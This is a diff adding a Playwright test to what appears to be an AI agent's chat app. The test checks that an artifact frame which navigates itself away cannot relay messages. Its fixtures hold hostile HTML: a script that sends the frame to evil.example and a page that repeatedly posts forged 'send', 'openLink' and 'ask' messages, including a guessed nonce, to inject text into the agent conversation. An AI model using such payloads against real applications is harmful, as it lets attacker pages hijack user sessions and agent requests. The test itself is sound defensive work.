@@ -228,3 +228,53 @@ test("'Always allow' skips the chip for the next send from the same artifact", a
   await expect(userTurns(page)).toHaveCount(2);
   await expect(page.getByTestId("artifact-send-confirm")).toHaveCount(0);
 });
+
+// #4143 re-review: the nested artifact frame may navigate ITSELF (its sandbox allows it), and the
+// replacing document still posts from the same WindowProxy the shell's `e.source` gate checks. The
+// shell now relays send/openLink/ask only with the per-render nonce baked into the srcdoc shim —
+// which a replacing page never sees — so a hijacked frame raises no chip and reaches no /ask.
+const NAVIGATING_CODE =
+  "<!doctype html><html><body>" +
+  '<div id="inline-mark">INLINE OK</div>' +
+  "<script>setTimeout(function(){ location.href = 'https://evil.example/art'; }, 200);</script>" +
+  "</body></html>";
+
+const ART_EVIL_HTML =
+  "<!doctype html><html><body><script>" +
+  "var i = 0; setInterval(function () { i += 1;" +
+  "  parent.postMessage({ type: 'protoArtifact:send', id: i, text: 'ART-EXFIL' }, '*');" +
+  "  parent.postMessage({ type: 'protoArtifact:send', id: 100 + i, text: 'ART-EXFIL', nonce: 'guess' }, '*');" +
+  "  parent.postMessage({ type: 'protoArtifact:openLink', id: 200 + i, url: 'https://evil.example/x' }, '*');" +
+  "  parent.postMessage({ type: 'protoArtifact:ask', id: 300 + i, prompt: 'leak' }, '*');" +
+  "}, 30);" +
+  "</script></body></html>";
+
+test("an artifact frame that navigates itself away loses send/openLink/ask (#4143)", async ({ page }) => {
+  await withInlineArtifact(page, NAVIGATING_CODE);
+  let evilLoaded = 0;
+  await page.route("https://evil.example/art", (route) => {
+    evilLoaded += 1;
+    return route.fulfill({ contentType: "text/html", body: ART_EVIL_HTML });
+  });
+  let asks = 0;
+  await page.route("**/api/plugins/artifact/ask", (route) => {
+    asks += 1;
+    return route.fulfill({ json: { text: "should never be asked" } });
+  });
+
+  await page.goto("/app/", { waitUntil: "load" });
+  const composer = page.getByPlaceholder(/Message protoAgent/i);
+  await composer.waitFor({ state: "visible" });
+  await composer.fill("ARTIFACTREF INLINE please");
+  await composer.press("Enter");
+  await expect(page.getByTestId("artifact-ref-inline")).toBeVisible();
+  await expect(page.locator(".pl-message--assistant").last()).toContainText("Here's the inline calculator.");
+  await expect(page.locator(".pl-message--assistant .spin")).toHaveCount(0);
+
+  await expect.poll(() => evilLoaded).toBeGreaterThan(0);
+  await page.waitForTimeout(800); // let the replacing page hammer the relay
+  await expect(page.getByTestId("artifact-send-confirm")).toHaveCount(0);
+  await expect(page.getByTestId("artifact-open-confirm")).toHaveCount(0);
+  await expect(page.locator(".pl-message--user", { hasText: "ART-EXFIL" })).toHaveCount(0);
+  expect(asks).toBe(0);
+});
